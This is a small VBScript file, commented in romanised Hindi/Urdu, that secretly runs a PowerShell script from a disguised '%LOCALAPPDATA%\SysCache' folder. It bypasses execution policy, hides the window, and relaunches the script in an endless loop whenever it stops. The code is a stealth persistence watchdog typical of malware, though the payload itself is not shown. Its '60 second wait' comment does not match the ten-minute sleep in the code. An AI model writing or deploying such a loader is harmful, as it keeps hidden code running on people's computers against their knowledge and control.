Option Explicit

Dim shell, wmi, processes, isRunning
Dim psCommand

Set shell = CreateObject("WScript.Shell")
Set wmi = GetObject("winmgmts:")

psCommand = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File ""%LOCALAPPDATA%\SysCache\win.ps1"""
' # thisistesting
'  Step 1: Pehli baar script run
shell.Run psCommand, 0

Do
    '  60 second wait
    WScript.Sleep 600000

    isRunning = False

    '  Check: specific PowerShell script chal rahi hai ya nahi
    Set processes = wmi.ExecQuery( _
        "Select * from Win32_Process Where Name='powershell.exe'" _
    )

    Dim p
    For Each p In processes
        If InStr(LCase(p.CommandLine), "win.ps1") > 0 Then
            isRunning = True
            Exit For
        End If
    Next

    '  Agar nahi chal rahi → dubara run
    If isRunning = False Then
        shell.Run psCommand, 0
    End If

Loop
